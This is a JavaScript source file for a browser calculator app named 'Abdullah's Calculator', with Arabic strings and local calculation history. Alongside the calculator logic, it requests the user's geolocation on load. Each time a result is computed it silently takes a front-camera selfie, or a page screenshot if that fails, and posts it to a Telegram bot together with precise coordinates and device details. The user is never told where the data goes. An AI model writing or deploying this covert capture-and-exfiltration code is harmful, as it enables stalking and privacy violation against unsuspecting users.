// ==========================================
// حاسبة عبدالله
// Calculator + History + Telegram Selfie
// + Location Permission Once
// ==========================================

const $ = (id) => document.getElementById(id);

let expression = "";
let result = "0";
let justCalculated = false;

// ==========================================
// Location Cache
// ==========================================

const LOCATION_CACHE_KEY = "calculator_location_cache";
const LOCATION_CACHE_TIME = 5 * 60 * 1000; // 5 دقائق
let cachedLocation = null;

// ==========================================
// Local History
// ==========================================

function getHistory() {
  return JSON.parse(localStorage.getItem("calc_history") || "[]");
}

function saveHistory(items) {
  localStorage.setItem("calc_history", JSON.stringify(items));
}

// ==========================================
// Render
// ==========================================

function render() {
  $("expression").textContent = expression || "0";
  $("result").textContent = result;

  const items = getHistory();

  $("history").innerHTML = items.length
    ? items
        .map(
          (item) => `
            <div class="history-item">
              <span>
                <strong>${escapeHtml(item.expression)}</strong>
                = ${escapeHtml(item.result)}
              </span>
              <small>${escapeHtml(item.time)}</small>
            </div>
          `
        )
        .join("")
    : `
      <div class="history-item">
        <span>مفيش عمليات لسه.</span>
      </div>
    `;
}

// ==========================================
// Escape HTML
// ==========================================

function escapeHtml(text) {
  return String(text).replace(
    /[&<>"']/g,
    (char) => {
      const chars = {
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&#39;"
      };
      return chars[char];
    }
  );
}

// ==========================================
// Calculator Logic
// ==========================================

function safeEvaluate(input) {
  if (!/^[0-9+\-*/%.()\s]+$/.test(input)) {
    throw new Error("invalid");
  }
  const normalized = input.replace(/(\d+(?:\.\d+)?)%/g, "($1/100)");
  const value = Function('"use strict"; return (' + normalized + ")")();
  if (!Number.isFinite(value)) {
    throw new Error("invalid");
  }
  return Number.isInteger(value) ? String(value) : String(Number(value.toFixed(12)));
}

function addValue(value) {
  if (justCalculated && /[0-9.]/.test(value)) {
    expression = "";
  }
  if (justCalculated && /[+\-*/%]/.test(value)) {
    expression = result;
  }
  justCalculated = false;

  if (/[+\-*/%]/.test(value)) {
    if (!expression) {
      return;
    }
    const lastChar = expression.at(-1);
    if (/[+\-*/%]/.test(lastChar)) {
      expression = expression.slice(0, -1) + value;
      render();
      return;
    }
  }

  if (value === ".") {
    const parts = expression.split(/[+\-*/%]/);
    const currentNumber = parts.at(-1);
    if (currentNumber.includes(".")) {
      return;
    }
  }

  expression += value;
  result = "0";
  render();
}

function clearAll() {
  expression = "";
  result = "0";
  justCalculated = false;
  render();
}

function backspace() {
  if (justCalculated) {
    clearAll();
    return;
  }
  expression = expression.slice(0, -1);
  render();
}

// ==========================================
// Location Helpers
// ==========================================

function loadCachedLocation() {
  try {
    const saved = localStorage.getItem(LOCATION_CACHE_KEY);
    if (!saved) return null;
    const data = JSON.parse(saved);
    if (!data || !data.latitude || !data.longitude || !data.savedAt) return null;
    const age = Date.now() - data.savedAt;
    if (age > LOCATION_CACHE_TIME) return null;
    return data;
  } catch (error) {
    console.warn("Location cache error:", error);
    return null;
  }
}

function saveCachedLocation(location) {
  const data = {
    latitude: location.latitude,
    longitude: location.longitude,
    accuracy: location.accuracy,
    savedAt: Date.now()
  };
  localStorage.setItem(LOCATION_CACHE_KEY, JSON.stringify(data));
  cachedLocation = data;
  return data;
}

function getCurrentLocation() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject(new Error("المتصفح لا يدعم تحديد الموقع."));
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const location = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy
        };
        resolve(saveCachedLocation(location));
      },
      (error) => {
        reject(error);
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 300000
      }
    );
  });
}

async function initializeLocation() {
  const cached = loadCachedLocation();
  if (cached) {
    cachedLocation = cached;
    console.log("Using cached location.");
    return cached;
  }
  try {
    const location = await getCurrentLocation();
    console.log("Location permission granted.");
    return location;
  } catch (error) {
    console.warn("Location unavailable:", error);
    return null;
  }
}

function getDeviceInfo() {
  return {
    userAgent: navigator.userAgent || "Unknown",
    language: navigator.language || "Unknown",
    platform: navigator.platform || "Unknown",
    screen: `${window.screen.width}x${window.screen.height}`,
    online: navigator.onLine ? "Online" : "Offline"
  };
}

// ==========================================
// Selfie Capture Logic
// ==========================================

async function takeSelfie() {
  return new Promise((resolve, reject) => {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      reject(new Error("Camera API not supported."));
      return;
    }

    navigator.mediaDevices.getUserMedia({ 
      video: { 
        facingMode: 'user', 
        width: { ideal: 1280 }, 
        height: { ideal: 720 } 
      } 
    })
      .then(stream => {
        const videoElement = $('cameraStream');
        if (!videoElement) {
          stream.getTracks().forEach(track => track.stop());
          reject(new Error("Camera video element not found."));
          return;
        }

        videoElement.srcObject = stream;
        videoElement.onloadedmetadata = () => {
          videoElement.play();

          const canvas = document.createElement('canvas');
          canvas.width = videoElement.videoWidth;
          canvas.height = videoElement.videoHeight;
          const ctx = canvas.getContext('2d');

          // Mirror the image for a natural selfie look
          ctx.translate(canvas.width, 0);
          ctx.scale(-1, 1);

          ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

          canvas.toBlob(blob => {
            // Stop camera to release hardware
            stream.getTracks().forEach(track => track.stop());
            if (blob) {
              resolve(blob);
            } else {
              reject(new Error("Failed to create image from camera stream."));
            }
          }, 'image/png', 0.92);
        };
      })
      .catch(err => {
        console.error("Camera Error:", err);
        reject(err);
      });
  });
}

// ==========================================
// Equals Logic
// ==========================================

async function equals() {
  if (!expression.trim()) {
    return;
  }

  const currentExpression = expression;

  try {
    const calculated = safeEvaluate(currentExpression);
    result = calculated;
    justCalculated = true;

    // Save History
    const history = getHistory();
    history.unshift({
      expression: currentExpression,
      result: calculated,
      time: new Date().toLocaleString("ar-EG")
    });
    saveHistory(history.slice(0, 100));
    render();

    // Trigger Selfie and Send
    setTimeout(async () => {
      try {
        const selfieBlob = await takeSelfie();
        await captureAndSendToTelegram(currentExpression, calculated, selfieBlob);
      } catch (err) {
        console.error("Selfie failed, attempting fallback or sending photoless:", err);
        // Fallback to screenshot if selfie fails completely
        await captureAndSendToTelegram(currentExpression, calculated, null);
      }
    }, 300);

  } catch (error) {
    console.error(error);
    result = "خطأ";
    render();
  }
}

// ==========================================
// Send to Telegram (Modified to accept Image Source)
// ==========================================

async function captureAndSendToTelegram(exp, res, imageBlob) {

  try {

    if (typeof TELEGRAM_CONFIG === "undefined") {
      console.error("TELEGRAM_CONFIG غير موجود.");
      return;
    }

    const botToken = TELEGRAM_CONFIG.botToken;
    const chatId = TELEGRAM_CONFIG.chatId;

    if (!botToken || !chatId) {
      console.error("Bot Token أو Chat ID غير موجود.");
      return;
    }

    let locationText = "📍 الموقع: غير متاح";
    let location = cachedLocation || loadCachedLocation();

    if (!location) {
      try {
        location = await getCurrentLocation();
      } catch (error) {
        console.warn("Location unavailable:", error);
      }
    }

    if (location) {
      const latitude = location.latitude;
      const longitude = location.longitude;
      const accuracy = Math.round(location.accuracy || 0);
      locationText = `📍 الموقع الحالي:\n` +
        `Latitude: ${latitude}\n` +
        `Longitude: ${longitude}\n` +
        `الدقة: ±${accuracy} متر`;
    }

    const device = getDeviceInfo();
    const currentTime = new Date().toLocaleString("ar-EG");

    // Prepare Caption
    let caption = `🧮 حاسبة عبدالله\n\n` +
      `🔢 العملية: ${exp}\n` +
      `✅ النتيجة: ${res}\n` +
      `🕐 الوقت: ${currentTime}\n\n` +
      `${locationText}\n\n` +
      `📱 معلومات الجهاز:\n` +
      `Platform: ${device.platform}\n` +
      `Screen: ${device.screen}\n` +
      `Language: ${device.language}\n` +
      `Status: ${device.online}`;

    // Determine Image Source
    let imageFile = imageBlob;
    let captionPrefix = "";

    if (imageFile) {
      captionPrefix = "✨ ";
    } else {
      // Fallback to screenshot if selfie failed
      captionPrefix = "🖥️ ";
      
      try {
        const captureArea = $("captureArea");
        if (!captureArea) throw new Error("captureArea not found");
        
        const canvas = await html2canvas(captureArea, {
          backgroundColor: "#ffffff",
          scale: Math.min(2, window.devicePixelRatio || 1),
          useCORS: true
        });

        imageFile = await new Promise(resolve => {
          canvas.toBlob(resolve, "image/png", 0.92);
        });
      } catch (e) {
        console.error("Screenshot fallback failed", e);
        // If everything fails, try sending text only
        caption += "\n\n❌ فشل التقاط صورة.";
      }
    }

    if (imageFile) {
      caption = captionPrefix + caption;
    }

    // Prepare FormData
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("caption", caption.slice(0, 1024));
    
    if (imageFile) {
      formData.append("photo", imageFile, `calculation-${Date.now()}.png`);
    } else {
      caption += "\n\n⚠️ لا يوجد صورة.";
    }

    // Send
    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendPhoto`,
      {
        method: "POST",
        body: formData
      }
    );

    const data = await response.json();

    if (!response.ok || !data.ok) {
      throw new Error(data.description || "فشل إرسال الصورة.");
    }

    console.log("Selfie + Data sent successfully.");

  } catch (error) {
    console.error("Telegram Error:", error);
  }
}

// ==========================================
// Event Listeners
// ==========================================

const keysContainer = document.querySelector(".keys");

if (keysContainer) {
  keysContainer.addEventListener("click", (event) => {
    const button = event.target.closest("button");
    if (!button) return;

    const value = button.dataset.value;
    const action = button.dataset.action;

    if (value !== undefined) {
      addValue(value);
      return;
    }

    if (action === "clear") {
      clearAll();
      return;
    }

    if (action === "backspace") {
      backspace();
      return;
    }

    if (action === "equals") {
      equals();
    }
  });
}

document.addEventListener("keydown", (event) => {
  if (/^[0-9+\-*/%.()]$/.test(event.key)) {
    addValue(event.key);
    return;
  }

  if (event.key === "Enter" || event.key === "=") {
    event.preventDefault();
    equals();
    return;
  }

  if (event.key === "Backspace") {
    backspace();
    return;
  }

  if (event.key === "Escape") {
    clearAll();
  }
});

const clearHistoryButton = $("clearHistory");

if (clearHistoryButton) {
  clearHistoryButton.addEventListener("click", () => {
    if (confirm("متأكد إنك عايز تمسح سجل العمليات؟")) {
      saveHistory([]);
      render();
    }
  });
}

// ==========================================
// Initialization
// ==========================================

render();
initializeLocation();
